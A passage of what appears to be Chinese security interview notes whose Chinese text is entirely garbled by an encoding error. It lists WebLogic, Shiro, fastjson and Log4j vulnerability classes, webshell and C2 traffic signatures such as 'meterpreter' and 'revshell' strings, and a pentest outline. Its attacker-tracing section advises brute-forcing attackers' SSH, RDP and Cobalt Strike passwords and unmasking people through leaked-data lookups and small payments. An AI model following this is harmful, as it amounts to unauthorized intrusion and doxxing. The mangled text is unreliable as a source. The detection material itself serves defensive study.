title="weblogicÊºèÊ¥û"></a>weblogicÊºèÊ¥û</h3><p>Âú®weblogicÈáåÈù¢ÂÖ∂ÂÆûÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®‰∏≠Â§ßËá¥ÂàÜ‰∏∫‰∏§ÁßçÔºå‰∏Ä‰∏™ÊòØÂü∫‰∫éT3ÂçèËÆÆÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºå‰∏Ä‰∏™ÊòØÂü∫‰∫éXMLÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p><p>1.Áõ¥Êé•ÈÄöËøá<strong>T3ÂçèËÆÆ</strong>ÂèëÈÄÅÊÅ∂ÊÑèÂèçÂ∫èÂàóÂåñÂØπË±°(CVE-2015-4582„ÄÅCVE-2016-0638„ÄÅCVE-2016-3510„ÄÅCVE-2020-2555„ÄÅCVE-2020-2883)<br>2.Âà©Áî®<strong>T3ÂçèËÆÆ</strong>ÈÖçÂêà<strong>RMP</strong>Êàñ<strong>NDÊé•Âè£</strong>ÂèçÂêëÂèëÈÄÅÂèçÂ∫èÂàóÂåñÊï∞ÊçÆ(CVE2017-3248„ÄÅCVE2018-2628„ÄÅCVE2018-2893„ÄÅCVE2018-3245„ÄÅCVE-2018-3191„ÄÅCVE-2020-14644„ÄÅCVE-2020-14645)ËøòÊúâÂà©Áî®<strong>IIOPÂçèËÆÆ</strong>ÁöÑCVE-2020-2551<br>3.ÈÄöËøá javabean <strong>XML</strong>ÊñπÂºèÂèëÈÄÅÂèçÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p><p><strong>xmlÔºö</strong>ÊòØÂõ†‰∏∫<strong>xmldecode</strong>Ëß£ÊûêÂØºËá¥ÁöÑÂèçÂ∫èÂàóÂåñÔºå‰ªñÁöÑÂåÖÂ∞±ÊòØ‰∏Ä‰∏™ÂæàÂ§ßÁöÑxmlÊ†ºÂºèÂÜÖÂÆπ</p><h3 id="fastjsonÂèçÂ∫èÂàóÂåñ"><a href="#fastjsonÂèçÂ∫èÂàóÂåñ" class="headerlink" title="fastjsonÂèçÂ∫èÂàóÂåñ"></a>fastjsonÂèçÂ∫èÂàóÂåñ</h3><p>ËØ∑Ê±ÇÂåÖÈáåÂèëÈÄÅÊÅ∂ÊÑèjsÊ†ºÂºèÁöÑpayloadÔºåÂú®Â§ÑÁêÜjsonÂØπË±°ÁöÑÊó∂ÂÄôÊ≤°ÊúâËøáÊª§@typeÂ≠óÊÆµÔºå‰ªéËÄå‰ΩøfastjsonÈÄöËøáÂ≠óÊÆµ‰º†ÂÖ•‰∏Ä‰∏™Á±ªÔºåÂú®ÊâßË°åÊó∂ËøõËÄåÂÆûË°åÊûÑÈÄ†ÊÅ∂ÊÑèÂáΩÊï∞„ÄÇ</p><h3 id="shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û"></a>shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û</h3><p><strong>shiro550Ôºö</strong></p><p><strong>ÂÖ≥ÈîÆËØçÔºöRememberMe</strong></p><p>Â≠òÂú®‰∏Ä‰∏™ÂøòËÆ∞ÂØÜÁ†ÅÂäüËÉΩÔºåÁî®Êà∑‰ø°ÊÅØ‰ºöËøõË°åÂä†ÂØÜÔºåËÄåËøô‰∏Ä‰∏™ËøáÁ®ã‰∏≠ÂØÜÈí•Âá∫Áé∞‰∫ÜÈóÆÈ¢òÔºå‰ΩøÁî®ÂØÜÈí•ËøõË°åÁ¢∞ÊíûÂπ∂‰∏î‰∏çÈúÄË¶ÅcookieÔºå‰ªéËÄåÊûÑÈÄ†ÂèçÂ∫èÂàóÂåñrceÔºåËøõËÄåÊîªÂáª„ÄÇ</p><p><strong>shiro721:</strong></p><p>shiro721Âà©Áî®ÁöÑÂâçÊèêÂ∞±ÊòØÂ≠òÂú®cookieÔºåÊûÑÈÄ†cookieÂÄºËøõË°årce„ÄÇ</p><h3 id="log4jÊºèÊ¥û-1"><a href="#log4jÊºèÊ¥û-1" class="headerlink" title="log4jÊºèÊ¥û"></a>log4jÊºèÊ¥û</h3><p>Log4j2 ÁªÑ‰ª∂Âú®Â§ÑÁêÜÁ®ãÂ∫èÊó•ÂøóËÆ∞ÂΩïÊó∂Â≠òÂú®JNDI Ê≥®ÂÖ•Áº∫Èô∑ÔºåÊú™ÁªèÊéàÊùÉÁöÑÊîªÂáªËÄÖÂà©Áî®ËØ•ÊºèÊ¥ûÔºåÂèØÂêëÁõÆÊ†áÊúçÂä°Âô®ÂèëÈÄÅÁ≤æÂøÉÊûÑÈÄ†ÁöÑÊÅ∂ÊÑèÊï∞ÊçÆÔºåËß¶ÂèëLog4j2 ÁªÑ‰ª∂Ëß£ÊûêÁº∫Èô∑ÔºåÂÆûÁé∞ÁõÆÊ†áÊúçÂä°Âô®ÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÔºåËé∑ÂæóÁõÆÊ†áÊúçÂä°Âô®ÊùÉÈôê„ÄÇ</p><p><strong>ÁâπÂæÅÔºö</strong>${xxxxxx}</p><h2 id="ÊµÅÈáèÁâπÂæÅ"><a href="#ÊµÅÈáèÁâπÂæÅ" class="headerlink" title="ÊµÅÈáèÁâπÂæÅ"></a>ÊµÅÈáèÁâπÂæÅ</h2><h3 id="csÊµÅÈáèÁâπÂæÅÔºö"><a href="#csÊµÅÈáèÁâπÂæÅÔºö" class="headerlink" title="csÊµÅÈáèÁâπÂæÅÔºö"></a><strong>csÊµÅÈáèÁâπÂæÅÔºö</strong></h3><p>ÂØπÊØîÊ≠£Â∏∏ÁöÑhttpÊµÅÈáèÔºåCSÁöÑhttpÈÄö‰ø°ÊµÅÈáèÂÖ∑Êúâ‰ª•‰∏ãÂá†‰∏™ÁâπÂæÅÔºö </p><p>A. <strong>ÂøÉË∑≥ÂåÖÁâπÂæÅ</strong> </p><p>a) Èó¥Èöî‰∏ÄÂÆöÊó∂Èó¥ÔºåÂùáÊúâÈÄö‰ø°Ôºå‰∏îÊµÅÁ∫ß‰∏äÁöÑ‰∏ä‰∏ãË°åÊï∞ÊçÆÈïøÂ∫¶Âõ∫ÂÆöÔºõ </p><p>B. <strong>ÂüüÂêç&#x2F;IPÁâπÂæÅ</strong> </p><p>a) Êú™Ëµ∞CDN„ÄÅÂüüÂâçÁΩÆÁöÑÔºåÂüüÂêçÂèäIPÊö¥Èú≤</p><p>b) Ëµ∞CDN„ÄÅÂüüÂâçÁΩÆÁöÑÔºåÁúüÂÆûIP‰ºöË¢´ÈöêËóèÔºõ </p><p>C. <strong>Êåá‰ª§ÁâπÂæÅ</strong> </p><p>a) ‰∏ãÂèëÊåá‰ª§Êó∂ÔºåÈÄöËøáÂøÉË∑≥ÂåÖÊé•Êî∂Êåá‰ª§ÔºåËøôÊó∂ÔºåserverÁ´ØËøîÂõûÁöÑÂåÖÊõ¥ÈïøÔºåÁîöËá≥ÂåÖÂê´Ë¶ÅÂä†ËΩΩÁöÑdllÊ®°ÂùóÊï∞ÊçÆ„ÄÇ </p><p>b) Êåá‰ª§ÊâßË°åÂÆåÂêéÔºåclientÁ´ØÈÄöËøáPOSTËØ∑Ê±ÇÂèëÈÄÅÊâßË°åÁöÑÁªìÊûúÊï∞ÊçÆÔºåbodyÈÉ®ÂàÜÈÄöËøáÂä†ÂØÜÂíåbase64ÁºñÁ†Å„ÄÇ </p><p>c) ‰∏çÂêåÊåá‰ª§ÔºåÊâßË°åÁöÑÊó∂Èó¥Èó¥Èöî‰∏ç‰∏ÄÊ†∑ÔºåÂèØ‰ª•ÈÄöËøáPOSTËØ∑Ê±ÇÂíåGETËØ∑Ê±ÇÁöÑÈó¥ÈöîËøõË°åÂà§Êñ≠„ÄÇ </p><p>D. <strong>Êï∞ÊçÆÁâπÂæÅ</strong> </p><p>a) Âú®ËØ∑Ê±ÇÁöÑËøîÂõûÂåÖ‰∏≠ÔºåÈÄö‰ø°Êï∞ÊçÆÂùáÈöêËóèÂú®jqeury*.js‰∏≠„ÄÇ</p><h3 id="MSFÊµÅÈáèÁâπÂæÅÔºö"><a href="#MSFÊµÅÈáèÁâπÂæÅÔºö" class="headerlink" title="MSFÊµÅÈáèÁâπÂæÅÔºö"></a><strong>MSFÊµÅÈáèÁâπÂæÅÔºö</strong></h3><p>1ÔºåÁ´ØÂè£Âè∑ÔºömsfÈªòËÆ§‰ΩøÁî®4444Á´ØÂè£‰Ωú‰∏∫ÂèçÂêëËøûÊé•Á´ØÂè£</p><p>2ÔºåÊï∞ÊçÆÂÜÖÂÆπÔºömsfÊï∞ÊçÆÂåÖÈÄöÂ∏∏ÂåÖÂê´ÁâπÂÆöÂ≠óÁ¨¶‰∏≤:(‚Äúmeterpreter‚Äù„ÄÅ‚Äùrevshell‚ÄùÁ≠â)</p><h3 id="ÂÜ∞ËùéÊµÅÈáèÁâπÂæÅ"><a href="#ÂÜ∞ËùéÊµÅÈáèÁâπÂæÅ" class="headerlink" title="ÂÜ∞ËùéÊµÅÈáèÁâπÂæÅ:"></a><strong>ÂÜ∞ËùéÊµÅÈáèÁâπÂæÅ:</strong></h3><p><strong>ÂÜ∞Ëùé2.0Âíå3.0Âå∫Âà´Ôºö</strong></p><p><strong>1ÔºåÂä†ÂØÜÊñπÂºè‰∏çÂêåÔºå‰∏Ä‰∏™ÊòØRC4Âä†ÂØÜÔºå‰∏Ä‰∏™AESÂä†ÂØÜ„ÄÇ</strong></p><p><strong>2ÔºåÁºñÂÜôËØ≠Ë®Ä‰∏çÂêåÔºå2.0ÈááÁî®ÁöÑÊòØc++Ôºå3.0ÈááÁî®ÁöÑÊòØjava„ÄÇ</strong></p><p><strong>3ÔºåÂÜ∞ËùéÊµÅÈáèÊ£ÄÊµãÔºåÊó†ËÆ∫ÊòØgetËØ∑Ê±ÇËøòÊòØpostËØ∑Ê±ÇÔºå</strong>content-typeÈÉΩ‰∏∫<strong>application&#x2F;octet-stream</strong>„ÄÇ</p><p>ÂÜ∞Ëùé4.0ÊµÅÈáèÂàÜÊûêÔºö1ÔºåÂçÅÁßçuaÂ§¥ÔºåÂèØÂÖ≥ÈîÆÂ≠óÊã¶Êà™uaÂ§¥ËøõË°åÂåπÈÖçÊã¶Êà™„ÄÇ</p><p>2ÔºåÊµÅÈáèÁâπÂæÅÔºåContent-type: Application&#x2F;x-www-form-urlencoded„ÄÇ</p><p>3ÔºåacceptÂ≠óÊÆµÔºöAccept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p><p>Ôºà4.0Êàë‰πü‰∏çÂ§™ÊòéÁôΩÔºåËá™Â∑±ÁΩë‰∏äÂ§öÊü•Êü•ËµÑÊñôÂêßÔºâ</p><h3 id="Âì•ÊñØÊãâÊµÅÈáèÁâπÂæÅ"><a href="#Âì•ÊñØÊãâÊµÅÈáèÁâπÂæÅ" class="headerlink" title="Âì•ÊñØÊãâÊµÅÈáèÁâπÂæÅ:"></a><strong>Âì•ÊñØÊãâÊµÅÈáèÁâπÂæÅ:</strong></h3><p>1ÔºåÂº∫ÁâπÂæÅÔºöcookieÂ≠óÊÆµÔºåÊúÄÂêé‰∏Ä‰∏™CookieÁöÑÂÄºÂá∫Áé∞  ‚Äú**;**‚ÄùÔºàÂ∞æÂÄºÂá∫Áé∞ÂàÜÂè∑Ôºâ</p><p>2ÔºåpaylodÁâπÂæÅÔºöjsp‰ºöÂá∫Áé∞xc,passÂ≠óÁ¨¶ÂíåJavaÂèçÂ∞ÑÔºåbase64Âä†Ëß£Á†ÅÁ≠âÁâπÂæÅÔºåphpÔºåaspÂàô‰∏∫ÊôÆÈÄöÁöÑ‰∏ÄÂè•ËØùÊú®È©¨„ÄÇ</p><h3 id="ËèúÂàÄÊµÅÈáèÁâπÂæÅÔºö"><a href="#ËèúÂàÄÊµÅÈáèÁâπÂæÅÔºö" class="headerlink" title="ËèúÂàÄÊµÅÈáèÁâπÂæÅÔºö"></a><strong>ËèúÂàÄÊµÅÈáèÁâπÂæÅÔºö</strong></h3><p>1ÔºåËØ∑Ê±ÇÂåÖ‰∏≠ÔºöuaÂ§¥‰∏∫ÁôæÂ∫¶ÔºåÁÅ´Áãê</p><p>2ÔºåËØ∑Ê±Ç‰Ωì‰∏≠Â≠òÂú®eavlÔºåbase64Á≠âÁâπÂæÅÂ≠óÁ¨¶<br>3ÔºåËØ∑Ê±Ç‰Ωì‰∏≠‰º†ÈÄíÁöÑpayload‰∏∫base64ÁºñÁ†ÅÔºåÂπ∂‰∏îÂ≠òÂú®Âõ∫ÂÆöÁöÑÊï∞ÂÄº</p><p>4.‰º™ÈÄ†X-Forwarded-ForÂ§¥</p><h3 id="ËöÅÂâëÊµÅÈáèÂàÜÊûêÔºö"><a href="#ËöÅÂâëÊµÅÈáèÂàÜÊûêÔºö" class="headerlink" title="ËöÅÂâëÊµÅÈáèÂàÜÊûêÔºö"></a><strong>ËöÅÂâëÊµÅÈáèÂàÜÊûêÔºö</strong></h3><p>1ÔºåpayloadÁâπÂæÅÔºöPhp‰∏≠‰ΩøÁî®assertÔºåevalÊâßË°åÔºõasp ‰ΩøÁî®evalÔºõÂú®jsp‰ΩøÁî®ÁöÑÊòØJavaÁ±ªÂä†ËΩΩÔºàClassLoaderÔºâÔºåÂêåÊó∂‰ºöÂ∏¶Êúâbase64ÁºñÁ†ÅËß£Á†ÅÁ≠âÂ≠óÁ¨¶ÁâπÂæÅ„ÄÇ</p><p>2ÔºåÊµÅÈáèÁâπÂæÅÔºöÊØè‰∏™ËØ∑Ê±Ç‰ΩìÈÉΩÂú®Ôºö@ini_set(‚Äúdiplay_erors‚Äù,‚Äú0‚Äù);@set_time_limit(0)ÂºÄÂ§¥„ÄÇÂπ∂‰∏îÂêéÈù¢Â≠òÂú®base64Á≠âÂ≠óÁ¨¶</p><h2 id="Â∏∏ËßÅÁöÑ‰∏≠Èó¥‰ª∂ÊºèÊ¥û"><a href="#Â∏∏ËßÅÁöÑ‰∏≠Èó¥‰ª∂ÊºèÊ¥û" class="headerlink" title="Â∏∏ËßÅÁöÑ‰∏≠Èó¥‰ª∂ÊºèÊ¥û"></a>Â∏∏ËßÅÁöÑ‰∏≠Èó¥‰ª∂ÊºèÊ¥û</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span>ÊºèÊ¥û„ÄÅÁü≠Êñá‰ª∂ÂêçÁåúËß£„ÄÅËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÅËß£ÊûêÊºèÊ¥û<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Ëß£ÊûêÊºèÊ¥û„ÄÅÁõÆÂΩïÈÅçÂéÜ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Êñá‰ª∂Ëß£Êûê„ÄÅÁõÆÂΩïÈÅçÂéÜ„ÄÅ<span class="token constant">CRLF</span>Ê≥®ÂÖ•„ÄÅÁõÆÂΩïÁ©øË∂ä<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÅwarÂêéÈó®Êñá‰ª∂ÈÉ®ÁΩ≤<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÅwarÂêéÈó®Êñá‰ª∂ÈÉ®ÁΩ≤<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûSSRF‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†warÂêéÈó®Êñá‰ª∂ÈÉ®ÁΩ≤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ÂÜÖÂ≠òÈ©¨Êü•Êâæ"><a href="#ÂÜÖÂ≠òÈ©¨Êü•Êâæ" class="headerlink" title="ÂÜÖÂ≠òÈ©¨Êü•Êâæ"></a>ÂÜÖÂ≠òÈ©¨Êü•Êâæ</h2><p><strong>windowsÔºö</strong>ÁúãÁúãdllÊñá‰ª∂ÔºåÊ≥®ÂÜåË°®ÔºåÊü•ÁúãÂ§ñËÅîÂèØ‰ª•ÁöÑvpsÁöÑÂú∞ÂùÄ„ÄÇ</p><p>**linux:**‰ΩøÁî®ÂëΩ‰ª§ËøõË°åÈÅçÂéÜ„ÄÇ</p><h2 id="Ê∏óÈÄèÊµãËØï"><a href="#Ê∏óÈÄèÊµãËØï" class="headerlink" title="Ê∏óÈÄèÊµãËØï"></a>Ê∏óÈÄèÊµãËØï</h2><h3 id="Á°ÆÂÆöÁõÆÊ†á"><a href="#Á°ÆÂÆöÁõÆÊ†á" class="headerlink" title="Á°ÆÂÆöÁõÆÊ†á"></a>Á°ÆÂÆöÁõÆÊ†á</h3><p>Âú®ÊãøÂà∞‰∏Ä‰∏™urlÊó∂ÔºåÂÖàÁ°ÆÂÆöËá™Â∑±ÁöÑÊ∏óÈÄèÁõÆÊ†áÔºåÊòØË¶ÅÊµãËØïÊï¥‰∏™ÁΩëÁ´ôËøòÊòØÊüê‰∏™Ê®°Âùó„ÄÇËá™Â∑±Ë¶ÅÂπ≤‰ªÄ‰πàÈ¶ñÂÖàË¶ÅÊÉ≥Ê∏ÖÊ•ö„ÄÇ</p><h3 id="‰ø°ÊÅØÊî∂ÈõÜ"><a href="#‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="‰ø°ÊÅØÊî∂ÈõÜ"></a>‰ø°ÊÅØÊî∂ÈõÜ</h3><p>Ê≠§Èò∂ÊÆµÊòØÊ∏óÈÄèÊµãËØï‰∏≠ÊúÄÂü∫Á°Ä‰πüÊòØÊúÄÂÖ≥ÈîÆÁöÑ‰∏ÄÊ≠•Ôºå‰ø°ÊÅØÊî∂ÈõÜÁöÑÂ§öÂ∞ë‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÂÜ≥ÂÆöÊòØÂê¶ËÉΩÂ§üÊ∏óÈÄèÊàêÂäü„ÄÇ‰ø°ÊÅØÊî∂ÈõÜËøáÁ®ã‰∏≠ÂèØ‰ª•ÂÄüÂä©<strong>ÊêúÁ¥¢ÂºïÊìé</strong>ÔºàfofaÔºåÈíüÈ¶ó‰πãÁúºÔºâËé∑Âæó‰∏Ä‰∫õÈáçË¶Å‰ø°ÊÅØ„ÄÇÊØîÂ¶ÇÂêéÂè∞ÔºåÊïèÊÑüÁöÑurlÁ≠â„ÄÇ</p><p>ÈÄöËøáÂüüÂêçÊâæÂà∞IPÔºåÂ≠êÂüüÂêçÔºåÊóÅÁ´ôÔºåÊòØÂê¶Â≠òÂú®CDN„ÄÇ<strong>ÔºàÁ´ôÈïøÂ∑•ÂÖ∑Ôºâ</strong></p><p>Êé¢ÊµãÁΩëÁ´ôÁõ∏ÂÖ≥ÁâàÊú¨‰ø°ÊÅØÔºåÂ¶ÇÊûúÁΩëÁ´ôÁî®‰∫ÜcmsÔºåÈÇ£Â∞±Êü•ÊâæcmsÊåáÁ∫πÔºåÊü•ÊâæËØ•cmsÊòØÂê¶Â≠òÂú®ÊºèÊ¥û„ÄÇ</p><p><strong>ÊóÅÁ´ô</strong>Ôºö‰∏éÊú¨ÁΩëÁ´ôÂÖ¨Áî®‰∏Ä‰∏™ÊúçÂä°Âô®„ÄÇ</p><p><strong>CÊÆµÔºàÊä§ÁΩë‰∏≠ËæÉÊúâÊÑè‰πâÔºâ</strong>ÔºöCÊÆµÊåáÁöÑÊòØÂêå‰∏ÄÂÜÖÁΩëÊÆµÂÜÖÁöÑÂÖ∂‰ªñÊúçÂä°Âô®„ÄÇ</p><p>Á≠âÁ≠â„ÄÇ</p><h3 id="ÊºèÊ¥ûÊâ´Êèè"><a href="#ÊºèÊ¥ûÊâ´Êèè" class="headerlink" title="ÊºèÊ¥ûÊâ´Êèè"></a>ÊºèÊ¥ûÊâ´Êèè</h3><p>ÂØπÁΩëÁ´ôËøõË°åÊºèÊ¥ûÊé¢ÊµãÔºåÂèØ‰ª•‰ΩøÁî®Áõ∏ÂÖ≥Â∑•ÂÖ∑Ôºà‰∏çÈóÆ‰∏çËØ¥ÔºöAWVS,Appscan,NessussÔºâ„ÄÇÊâ´ÊèèÂà∞ÊºèÊ¥ûÁöÑËØùËøõË°åÊºèÊ¥ûÈ™åËØÅÂà©Áî®„ÄÇ</p><p>È°∫Âà©ÁöÑËØùÊúÄÁªàÊãøÂà∞webshell„ÄÇ</p><p>ÊµãËØïÁªìÊùüÂêéÊÄªÁªìÊï¥‰∏™ÊµÅÁ®ãÔºåÁªôÁõ∏ÂÖ≥Êú∫ÊûÑÊèêÂá∫‰øÆÂ§çÂª∫ËÆÆ„ÄÇ</p><h3 id="ÊãøÂà∞ÁΩëÁ´ôÁôªÂΩïÊ°ÜËØ•ÊÄé‰πà‰∏ãÊâã"><a href="#ÊãøÂà∞ÁΩëÁ´ôÁôªÂΩïÊ°ÜËØ•ÊÄé‰πà‰∏ãÊâã" class="headerlink" title="ÊãøÂà∞ÁΩëÁ´ôÁôªÂΩïÊ°ÜËØ•ÊÄé‰πà‰∏ãÊâã"></a>ÊãøÂà∞ÁΩëÁ´ôÁôªÂΩïÊ°ÜËØ•ÊÄé‰πà‰∏ãÊâã</h3><p>È¶ñÂÖàÂàÜÊûêÁôªÂΩïÊ°ÜÁöÑÂèÇÊï∞„ÄÇ</p><p>Â∞ùËØïÂº±Âè£‰ª§ÁôªÂΩïÔºåËÉΩÂ§üËøõË°åÁàÜÁ†¥ÁöÑËØùËøõË°åÁàÜÁ†¥„ÄÇ</p><p>SQLÊ≥®ÂÖ•Âú®ÁôªÈôÜÊ°Ü‰πüÂÆπÊòìÂá∫Áé∞ÔºåÂ¶ÇÊûúÂ≠òÂú®sqlÊ≥®ÂÖ•ÊºèÊ¥ûÁöÑËØùÈÇ£Â∞±ËøõË°åÊîªÂáª„ÄÇ</p><h2 id="Ê∫ØÊ∫êÁöÑÊÄùË∑Ø"><a href="#Ê∫ØÊ∫êÁöÑÊÄùË∑Ø" class="headerlink" title="Ê∫ØÊ∫êÁöÑÊÄùË∑Ø"></a>Ê∫ØÊ∫êÁöÑÊÄùË∑Ø</h2><p>1.Á∫¢ÈòüÊîªÂáªÈÉΩ‰ºöÊåÇÁùÄ‰ª£ÁêÜÔºå‰Ω†Ê∫ØÊ∫êÁöÑËØùÂè™ËÉΩÊ∫ØÊ∫êÂà∞‰ªñÁöÑ‰ª£ÁêÜipÔºåÊ≤°ÊúâÂ§™Â§ßÁöÑÊÑè‰πâÔºåÂ¶ÇÊûúËØ¥ÊúçÂä°Âô®Ë¢´‰∏ä‰∫ÜÂÜÖÂ≠òÈ©¨ÁöÑÊÉÖÂÜµÔºåÂèØ‰ª•ÂéªÂ∑•ÂÖ∑ÂèñÊ†∑‰ªñÂÜÖÂ≠òÈ©¨ÁöÑipÔºåÂØπÂÜÖÂ≠òÈ©¨ipÂèçÂêëÊâ´ÊèèÁ´ØÂè£Ôºå<br>Âõ†‰∏∫‰ªñ‰ª¨‰πüÊòØÈÄöËøáËøúÁ®ãËøõÂéªÁöÑÔºåÂéªÁàÜÁ†¥‰ªñ‰ª¨ÁöÑssh,3389ÂíåcsÁöÑÂØÜÁ†Å„ÄÇ<br>1.ÂèçÂ∫èÂàóÂåñÁöÑÂèñÊ†∑Ôºå‰ªñÊâìshiroÔºåÈáåÈù¢Â∞±Êúâ‰ªñÁöÑÂü∫Êú¨ËÆæÂ§ávpsÔºåÈÄöËøá‰∏≠Èó¥‰ª∂ÂêßËøô‰∫õÊúâÁâπÂæÅÁöÑipÊî∂ÈõÜÔºåÊîæÂà∞Âú®Á∫øÊÉÖÊä•Âπ≥Âè∞‰∏äËØÜÂà´ÔºåÊ£ÄÊµãÊòØ‰∏çÊòØÊúâipÁªëÂÆöÂüüÂêçÁöÑÔºåÈÄöËøáwhoisÂèçÊü•‰ªñÁöÑÂüüÂêçÊ≥®ÂÜåÊó∂Èó¥„ÄÅÈÇÆÁÆ±ÔºåÈÄöËøáÁ§æÂ∑•Â∫ìÊü•‰ªñÁöÑÊâãÊú∫Âè∑ÔºåÁÑ∂ÂêéÈÄöËøáÁ§æ‰∫§ËΩØ‰ª∂Ôºåqq„ÄÅÂæÆ‰ø°„ÄÅÊîØ‰ªòÂÆùÊù•Áªô‰ªñËΩ¨‰∏ÄÊØõÈí±ÔºåÊãºÊé•‰ªñÁöÑ‰∏™‰∫∫‰ø°ÊÅØ„ÄÇ</p><p>4.Â∑≤ÁªèË¢´‰∏ä‰º†webshellÂ∫îÊÄ•<br>2.Á≥ªÁªüÂ¶ÇÊûúÂ∑≤ÁªèË¢´Ê§çÂÖ•ÂêéÈó®ÔºåËØ¥ÊòéÊîªÂáªËÄÖÂ∑≤ÁªèÊîªÂáªÊàêÂäüÔºåËÄå‰∏îÊãøÂà∞ÊùÉÈôêÔºåËøôÊó∂ÂÄôÊó•Âøó‰ø°ÊÅØÂèØËÉΩÊèê‰æõ‰∏ç‰∫ÜÂ∏ÆÂä©ÔºåÈ¶ñÂÖàË¶ÅÂéªËÄÉËôëÁ≥ªÁªüÁöÑË¥¶Êà∑ÊòØÂê¶ÂÆâÂÖ®ÔºåÔºåÂèàÊ≤°Âè£‰ª§ÁàÜÁ†¥ÊàêÂäüÁöÑÁóïËøπÔºåÊéíÊü•Ë¥¶Âè∑ÁöÑÂØÜÁ†ÅÊòØÂê¶Â∑≤Áªè‰∏çÂÆâÂÖ®.<br>(Linux)ÁöÑËØùÁúãËÆ°Âàí‰ªªÂä°,ÊúâÊ≤°ÊúâÂÆöÊó∂ÂèçÂºπshell,ËøòÊúâÂ∞±ÊòØËøõÁ®ãÊòØ‰∏çÊòØÂèØÁñëÂú®ÈÄö‰ø°.ÂèëÁé∞ÂèØÁñëÈóÆÈ¢ò,Â∞±Ë¶ÅÊ†∑Êú¨ÂàÜÊûê.<br>(windows)ÁöÑËØùÂ∞±ÁúãÂêØÂä®È°πÂíåËøõÁ®ã.<br>Â¶ÇÊûúÊòØwebÂÖ•‰æµ,ÁúãÊó•ÂøówebÊúçÂä°ÊòØ‰∏çÊòØÂÆâÂÖ®?ËøòÂéüÊîªÂáªÁöÑÊµÅÁ®ã.<br>5.ÊµÅÈáèÊ∫ØÊ∫ê<br>1.ÂÖàÁúãÊó•ÂøóÔºåÁúãÊîªÂáªÊó∂Èó¥ÂÅö‰∏Ä‰∏™ÂÆ°ËÆ°ÔºåÊêúÁ¥¢Ëøô‰∏™Êó∂Èó¥Êñá‰ª∂‰∏ä‰º†ÁöÑÊìç‰ΩúÔºå‰∏ÄËà¨ÊòØGETÂíåPOST‰∏§ÁßçÔºåGETÁöÑËØùÂèØ‰ª•Áõ¥Êé•ÁúãÂà∞‰ªñËØ∑Ê±ÇÁöÑËµÑÊ∫ê„ÄÅÂú∞ÂùÄÂíåcontentÔºåÁÑ∂ÂêéwebshellËØ•ÊùÄÂ∞±ÊùÄÔºåÂêéÈó®ÊîπË°•Â∞±Ë°•ÔºåÂ¶ÇÊûúÊòØPOSTÔºåÈÇ£‰πàÂ∞±Áúã‰∏çÂà∞ËØ∑Ê±ÇÁöÑÂÜÖÂÆπÔºåÂèØ‰ª•ÂéªÈò≤ÁÅ´Â¢ô‰∏ä‰∏ãËΩΩÂÆåÊï¥Êï∞ÊçÆÂåÖÊù•ÂàÜÊûê„ÄÇ</p><h2 id="Ê∫ØÊ∫êÂèçÂà∂ÁöÑÊÄùË∑ØÔºü"><a href="#Ê∫ØÊ∫êÂèçÂà∂ÁöÑÊÄùË∑ØÔºü" class="headerlink" 